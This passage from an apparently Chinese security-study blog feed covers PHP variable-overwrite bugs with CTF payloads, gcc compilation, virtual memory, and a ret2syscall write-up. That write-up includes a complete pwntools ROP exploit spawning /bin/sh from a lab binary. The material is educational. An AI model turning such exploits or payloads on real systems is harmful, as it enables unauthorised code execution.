class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>作用：从数组中将变量导入到当前的符号表</p></blockquote><p>在调用extract()时使用在flag选项使用EXTR_SKIP保证已有变量不会被覆盖 ，flag字段的可用选项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXTR_OVERWRITE如果有冲突，覆盖已有的变量。</span><br><span class="line">EXTR_SKIP如果有冲突，不覆盖已有的变量。</span><br><span class="line">EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。EXTR_IF_EXISTS仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</span><br></pre></td></tr></table></figure><p><strong>4、parse_str()变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><blockquote><p>作用： 如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） </p></blockquote><blockquote><p>PS： 不赞同没有 result参数的情况下使用此函数，并且在 PHP 7.2 中将<em>废弃</em>不设置参数的行为。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var=<span class="string">'shabi'</span>;  </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="keyword">print</span> $var;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码很简单，就是定义一个 $var 变量，然后用parse_str来近些URL查询字符串，那我就可以通过查询 var 参数来覆盖到原来的 $var 变量，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="keyword">var</span> = congming</span><br></pre></td></tr></table></figure><p><strong>5、import_request_variables变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(PHP <span class="number">4</span> &gt;= <span class="number">4.1</span><span class="number">.0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span><span class="number">.0</span>)  </span><br><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：将 GET／POST／Cookie 变量导入到全局作用域中</p></blockquote><blockquote><p>PS：第一个参数 types 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。</p><p>这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。</p><p>注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。</p><p>任何 GPC 以外的字母都将被忽略。</p></blockquote><blockquote><p>PPS：第二个参数 prefix 作为变量名的前缀，置于所有被导入到全局作用域的变量之前。若没有指定第二个参数很容易导致变量覆盖。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">import_request_variables(<span class="string">"g"</span>);</span><br><span class="line"><span class="keyword">if</span>($radish==<span class="string">"radish"</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FIlE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为没有指定前缀，并且函数指定了可以通过GET方式进行全局导入，我们能轻易覆盖变量，提交payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?radish=radish</span><br></pre></td></tr></table></figure><h2 id="六、反序列化"><a href="#六、反序列化" class="headerlink" title="六、反序列化"></a>六、反序列化</h2><p><strong>1、基本概念：</strong></p><ul><li>序列化：把对象转换为字节序列的过程称为对象的序列化</li><li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化</li></ul><p><strong>2、漏洞成因：</strong></p><p><strong>反序列化对象</strong>中存在<strong>魔术方法</strong>，而且魔术方法中的<strong>代码</strong>可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入，sql注入，目录遍历等等 </p><p><strong>3、漏洞本质：</strong></p><p>unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于反序列化的内容已经补齐，在“PHP反序列化”一篇中；关于代码审计具体关注点和关注函数在“代码审计关注点”中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计思路&quot;&gt;&lt;a href=&quot;#代码审计思路&quot; class=&quot;headerlink&quot; title=&quot;代码审计思路&quot;&gt;&lt;/a&gt;代码审计思路&lt;/h1&gt;&lt;p&gt;面试的时候问到了关于代码审计的思路，这里就简单总结一下。&lt;/p&gt;
&lt;p&gt;常见的代码审计思路有以下四种：&lt;/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY2</title>
    <link href="http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/"/>
    <id>http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/</id>
    <published>2019-12-21T07:57:52.000Z</published>
    <updated>2019-12-21T08:36:58.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day2"><a href="#程序员的自我修养-Day2" class="headerlink" title="程序员的自我修养 Day2"></a>程序员的自我修养 Day2</h1><p>上一篇文章是对操作系统和计组的一些基本概念进行了复习，这一篇主要是用来学习编译和链接的过程。</p><h2 id="gcc-编译过程"><a href="#gcc-编译过程" class="headerlink" title="gcc 编译过程"></a>gcc 编译过程</h2><p>我们在Linux下，对一个简单的hello.c的C文件使用命令gcc就能对其进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><p>上面的命令就是用gcc编译生成a.out，然后执行了a.out。看似很简单一气呵成，但其实gcc的过程包括了4个步骤：</p><p><strong>预处理</strong>（Prepressing）-&gt; <strong>编译</strong>（Compilation）-&gt; <strong>汇编</strong>（Assembly）-&gt; <strong>链接</strong>（Linking）， 这个gcc编译过程入下图所示：</p><p><img src="/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/gcc%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" alt></p><p>我们下面分开讲解这四个步骤。</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>预编译相当于使用了下面这个命令（-E 参数代表只进行预编译）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i （执行后输出hello.i文件）</span><br></pre></td></tr></table></figure><p>预编译过程是对源代码中#开始的预编译指令进行处理：</p><ul><li>删除所有的”#define”，展开所有的宏定义</li><li>处理所有的条件预编译指令，如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li><li>处理”#include”预编译指令，将包含文件插入到该预编译指令的位置</li><li>删除注释 “//“、”/**/“</li><li>保留所有的#pragma编译器指令</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s  （执行后输出hello.s文件）</span><br></pre></td></tr></table></figure><p>对于C语言来说，执行预编译和编译的程序是cc1；对于C++来说，对应的程序叫做cc1plus；Objective-C则是cc1obj；Java则是jc1。所以<strong>gcc只是对这些后台程序的包装，它根据不同参数要求去调用不同的预编译编译程序cc1、汇编器as、链接器ld</strong>。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o  （执行后输出hello.s文件）</span><br><span class="line">或者直接调用汇编器</span><br><span class="line">as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>也可以直接一步到位，由C源码直接预编译、编译、汇编输出成<strong>目标文件</strong>（object file）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>如果通过调用链接器ld来执行，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc -end-group crtend.o crtn.o</span><br></pre></td></tr></table></figure><p>需要将上面这一大堆文件链接起来才可以得到最后的a.out可执行文件。这里的过程后面补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day2&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day2&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day2&quot;&gt;&lt;/a&gt;程序员的自我修养 Day2&lt;/h1&gt;&lt;p&gt;上一篇文章是对操作系统和计组的一些基本概念进行了复习
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY1</title>
    <link href="http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/"/>
    <id>http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/</id>
    <published>2019-12-20T15:34:12.000Z</published>
    <updated>2019-12-24T02:38:06.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day1"><a href="#程序员的自我修养-Day1" class="headerlink" title="程序员的自我修养 Day1"></a>程序员的自我修养 Day1</h1><p>静下心来好好研究计算机底层的实现，为二进制安全的研究做好铺垫。</p><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机的结构是一种由上而下组成的层结构，通过中间件进行访问：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt></p><p>这其中每个层级之间的通信协议就称为 “<strong>接口</strong>“。下层是接口的提供者，上层是接口的使用者。每个中间层都是对它下层的包装和拓展。</p><p>从上图我们可以看出：</p><ul><li>应用程序和开发工具通过<strong>操作系统API</strong>（API：Application Programming Interface 应用程序编程接口）和运行库（不同的运行库提供不同的API，例如Linux下的Glibc提供POSIX的API等）进行交互；</li><li>运行库使用的是操作系统提供的<strong>系统调用接口</strong>（System Call Interface），在现实中常通过软件中断的方式提供（Linux系统用0x80号中断作为系统调用接口，而Window中通过0x2E号中断作为系统调用接口）；</li><li>操作系统内核层对于硬件接口来说是使用者，而硬件接口定义决定了操作系统内核。硬件和操作系统内核之间的接口常称为”<strong>硬件规格</strong>“（Hardware Specification）；</li></ul><p>这样我们就大致的了解了计算机不同层次之间的组织关系和联系方式。</p><h2 id="给进程分配内存"><a href="#给进程分配内存" class="headerlink" title="给进程分配内存"></a>给进程分配内存</h2><p>简单的直接分配地址策略会导致下面几个问题：（具体例子可以直接看书）</p><ul><li><p><strong>地址空间不隔离</strong>：因为所有程序都放在同一片内存空间中没有隔离，恶意程序或者BUG程序可能会很轻易地改写到其他程序的数据（Overflow的意思）</p></li><li><p><strong>内存使用效率低</strong>：因为地址空间连续，当前换出的程序的空间可能不够等待运行的程序的装入，造成空间的浪费。另一方面，程序运行中频繁的换入换出也会使得效率极低·</p></li><li><p><strong>程序运行的地址不确定</strong>：因为每次程序需要装入时，我们需要从内存中分配一段足够的空闲空间给它，而这个空闲空间的地址是不确定的。这就涉及到了重定位问题。</p></li></ul><p>既然直接分配内存明显是不行的，我们就可以引入一个中间件 “虚拟地址”，达到一种间接访问物理地址的方法。思路是这样的：使用<strong>某些映射方法来控制由虚拟地址到物理地址的映射</strong>过程。那么只要我们妥善控制了这个映射的方法，就能保证每一个程序之间的隔离效果。</p><h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><blockquote><p>首先附上汇编之前学过的知识：</p><p>十六进制0x串转为二进制 ：将每个位对应写成4位二进制形式</p></blockquote><p>贴上分段范例的示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E6%AE%B5.png" alt></p><p>上图使用的例子大概意思是： 现在有某个程序A，大小为10MB(计算：0xA00000 即是0xA个0x100000 。 其中的0x100000即是2^20个bit 即是1M。0xA个即是有10个1MB。那么就是程序A的大小为10MB)。它在虚拟地址中分配一段由0x00000000到0x00A00000的虚拟空间。 随后我们在物理地址空间里面的分配对应的相同大小的空间，假设这段空间由0x00100000到0x00B00000。<strong>虚拟空间里面的每个字节对应着物理空间里面的每个字节</strong>。那么当程序A里面访问到地址0x00001000的时候，CPU就会将这个地址转为真实的物理地址0x00101000。程序B也是同理。</p><p>假如当程序A访问虚拟地址超出了0x00A00000，就会被判断为非法访问并拒绝访问，这样就能避免程序覆盖了其他程序到导致错误。另一方面，程序不用关心它会被分配到真实物理空间的哪一区域，它只要按照自己程序的虚拟空间0x00000000到0x00A0000来编写程序和放置变量即可。</p><p>所以使用这种分段式方法基本解决了不隔离和地址不确定两个问题。我们得继续探讨如何处理效率低下的问题</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>首先贴出分页的范例示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E9%A1%B5.png" alt></p><p>我们首先规定一些概念：</p><ul><li>虚拟空间的页叫做”<strong>虚拟页</strong>“（Virtual Page，简称VP）</li><li>物理内存的页叫做”<strong>物理页</strong>“ （Physical Page，简称PP）</li><li>磁盘中的页叫做”<strong>磁盘页</strong>“ （Disk Page，简称DP）</li></ul><p>然后我们对上图进行分析：</p><p>进程1中的虚拟页VP0、VP1和VP7映射到了物理页PP0、PP2和PP3上面；然后进程1中有部分虚拟页位于磁盘页中，即VP2、VP3分别位于磁盘中的DP0和DP1；进程1中剩下的虚拟页VP4-VP6可能因为还没调用或者被访问到，处于未访问的状态。</p><p>VP2、VP3没有位于物理内存中，当进程需要调用到VP2和VP3的时候，硬件就会捕捉到这个消息 ：”页错误”。然后<strong>操作系统就会接管进程</strong>负责从磁盘中将VP2和VP3读入到内存中，然后再将内存中的这两个PP和虚拟页中的VP2、VP3<strong>建立映射关系</strong>。</p><p>这样分页就达成了提高效率的目的</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程的简单定义是：<strong>轻量级进程</strong>，线程是程序执行流程的最小单元。</p><p>线程具有三种基本状态：就绪 、运行 、等待</p><p>今天先写到这里吧。。。后面继续补上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day1&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day1&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day1&quot;&gt;&lt;/a&gt;程序员的自我修养 Day1&lt;/h1&gt;&lt;p&gt;静下心来好好研究计算机底层的实现，为二进制安全的研究
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2syscall</title>
    <link href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/"/>
    <id>http://bai-ren-1.github.io/2019/12/06/ret2syscall/</id>
    <published>2019-12-06T08:23:27.000Z</published>
    <updated>2019-12-07T04:31:35.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p><p>先附上有点模糊了的知识：</p><p>1、x86下 ip 调用指令的过程：</p><blockquote><p>1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p><p>2、ip += 所读指令的长度，从而指向下一条指令；</p><p>3、执行指令，然后返回第一步</p></blockquote><p>2、入栈 push 操作的本质：（pop就是反过来）</p><blockquote><p>1、esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p><p>2、将数据传入这个新的栈顶单元</p></blockquote><p>3、call 和 ret 的原理</p><blockquote><p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p><p>2、ret ：pop ip （栈顶出栈给 ip，让ip继续执行之前指令后面的指令） </p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><p>贴上wiki上面关于syscall的解释：</p><blockquote><p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p><p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p></blockquote><p><img src="/2019/12/06/ret2syscall/syscall.png" alt></p><p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p><blockquote><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）；</li></ol></blockquote><p>同时附上操作系统实现系统调用的过程：</p><blockquote><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序。</li></ol></blockquote><p>现在知道了通过 int 80h 我们就能在程序中调用系统调用，这里附上 Linux 系统调用表：</p><table><thead><tr><th>%eax</th><th>系统调用名</th><th>源代码</th><th>%ebx</th><th>%ecx</th><th>%edx</th><th>%esx</th><th>通过堆栈</th></tr></thead><tbody><tr><td>1</td><td>sys_exit</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>sys_fork</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>sys_read</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>4</td><td>sys_write</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>5</td><td>sys_open</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td>sys_close</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>sys_waitpid</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td>sys_creat</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>sys_link</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>sys_unlink</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>sys_execve</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>sys_chdir</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>sys_time</td><td><a href="file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>sys_mknod</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td>-</td><td>-</td></tr><tr><td>15</td><td>sys_chmod</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>sys_lchown</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>18</td><td>sys_stat</td><td><a href="file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td>sys_lseek</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#off_t" target="_blank" rel="noopener">off_t</a></td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td>sys_getpid</td><td><a href="file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用 ctf-wiki 上面的 ret2syscall（在我本地的文件名为 pwn） ，基本信息就直接说了。下面是 main 的代码，还是 gets 栈溢出然后控制程序执行。通过 cyclic 可以得到栈溢出到返回地址的偏移地址是112；然后程序是32位，开启了NX保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在原程序里面是找不到系统命令直接可以 ret 的，于是我们得使用到syscall。</p><p>在这里我们决定构成下面这个系统调用： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">'/bin/sh'</span>);</span><br></pre></td></tr></table></figure><p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p><p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p><p><img src="/2019/12/06/ret2syscall/ret2syscall-1.png" alt></p><p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p><p>然后我们继续寻找 ebx :</p><p><img src="/2019/12/06/ret2syscall/syscall-2.png" alt></p><p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p><p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p><p><img src="/2019/12/06/ret2syscall/syscall-3.png" alt></p><p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p><p><img src="/2019/12/06/ret2syscall/syscall-4.png" alt></p><p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>下面用详细大白话解释exp：</p><blockquote><p>112个 a 控制溢出到返回地址，我们设置返回地址为 